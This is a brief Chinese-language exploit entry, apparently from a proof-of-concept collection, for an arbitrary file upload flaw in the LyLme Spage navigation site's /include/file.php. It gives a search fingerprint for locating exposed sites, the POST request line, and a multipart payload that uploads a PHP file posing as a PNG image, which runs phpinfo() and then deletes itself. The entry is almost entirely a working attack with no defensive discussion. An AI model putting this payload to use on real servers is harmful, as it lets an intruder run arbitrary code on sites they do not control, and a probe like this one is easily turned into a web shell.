# 六零导航页file.php任意文件上传漏洞

六零导航页file.php ｜ 文件上传 ｜ —
- **指纹**：`title=="上网导航 - LyLme Spage"`
- **请求**：`POST /include/file.php HTTP/1.1`

**Payload**
```
-----------------------------207262699182048909098055515
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: image/png
<?php phpinfo();unlink(__FILE__);?>
-----------------------------207262699182048909098055515--
```